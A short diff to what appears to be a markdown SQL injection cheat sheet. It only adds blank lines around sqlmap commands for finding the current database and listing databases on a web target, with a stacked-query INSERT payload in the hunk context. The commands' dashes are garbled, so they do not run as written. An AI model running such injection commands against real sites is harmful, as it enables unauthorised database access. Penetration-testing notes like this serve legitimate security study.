@@ -45,9 +45,10 @@ http://www.example.com/product.php?id=10; INSERT INTO users (…)
 ### [SQLMap](https://sqlmap.org/)
 
 **Step-1:** Find current database name
-For URL: `sqlmap –u http://www.nayan.com/item_id=3 - -level=5 - -risk=3 - -current-db - -batch`
-For Request: `sqlmap –r Desktop/test.txt - -level=5 - -risk=3 - -current-db - -batch`
 
+For URL: `sqlmap –u http://www.nayan.com/item_id=3 - -level=5 - -risk=3 - -current-db - -batch`
+
+For Request: `sqlmap –r Desktop/test.txt - -level=5 - -risk=3 - -current-db - -batch`
 
 **Step-2:** List DBMS database
   `sqlmap –u http://www.nayan.com/item_id=3 - -dbs`
